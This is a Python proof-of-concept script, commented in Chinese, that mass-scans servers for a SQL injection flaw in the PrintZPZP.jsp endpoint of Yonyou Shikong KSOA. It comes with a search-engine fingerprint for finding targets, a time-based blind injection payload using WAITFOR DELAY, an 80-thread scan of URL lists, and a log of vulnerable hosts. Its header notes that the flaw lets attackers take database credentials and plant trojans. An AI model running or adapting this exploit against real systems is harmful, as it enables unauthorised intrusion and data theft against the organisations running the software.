# -*- coding: utf-8 -*-
# 用友时空KSOA PrintZPZP.jsp SQL注入漏洞
# app="用友-时空KSOA"
# 产品简介:用友时空 KSOA 是建立在 SOA 理念指导下研发的新一代产品，是根据流通企业前沿的 IT 需求推出的统一的IT基础架构，它可以让流通企业各个时期建立的 IT 系统之间彼此轻松对话。
# 漏洞概述:用友时空KSOA系统 PrintZPZP.jsp接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def bunner():
    test = """                                                            
    \x1b[38m██╗  ██╗███████╗ ██████╗  █████╗       ███████╗ ██████╗ ██╗     
    \x1b[36m██║ ██╔╝██╔════╝██╔═══██╗██╔══██╗      ██╔════╝██╔═══██╗██║     
    \x1b[34m█████╔╝ ███████╗██║   ██║███████║█████╗███████╗██║   ██║██║     
    \x1b[35m██╔═██╗ ╚════██║██║   ██║██╔══██║╚════╝╚════██║██║▄▄ ██║██║     
    \x1b[31m██║  ██╗███████║╚██████╔╝██║  ██║      ███████║╚██████╔╝███████╗
    \x1b[33m╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝      ╚══════╝ ╚══▀▀═╝ ╚══════╝                                               
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>                                       
      --author:Kucei  --Vession:用友时空KSOA_PrintZPZP.jsp_SQL注入
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)

def main():
    bunner()
    # 初始化
    parser = argparse.ArgumentParser("用友时空KSOA_PrintZPZP.jsp_SQL注入")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 创建一个列表接收 文件夹的URL
        url_list = []
        with open(args.file,'r') as fp:
            # 遍历文件夹内的URL
            for url in fp.readlines():
                # append 往列表添加元素
                url_list.append(url.strip())
        # 创建线性池
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else :
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload1 = "/kp/PrintZPZP.jsp?zpshqid=1"
    url_payload2 = "/kp/PrintZPZP.jsp?zpshqid=1';WAITFOR+DELAY+'0:0:5'--"
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
        'Connection': 'close',
    }
    try :
        response1 = requests.get(url=target+url_payload1,headers=headers,verify=False,timeout=7)
        response2 = requests.get(url=target+url_payload2,headers=headers,verify=False,timeout=7)
        # print(response.status_code)
        # print(response.text)
        time1 = response1.elapsed.total_seconds()
        time2 = response2.elapsed.total_seconds()
        if response1.status_code == 200 and time2 - time1 >= 3.6:
            print( f"[+] {target} 存在漏洞！\n")
            with open('用友时空KSOA_PrintZPZP_SQL.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload2+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")

if __name__ == '__main__':
    main()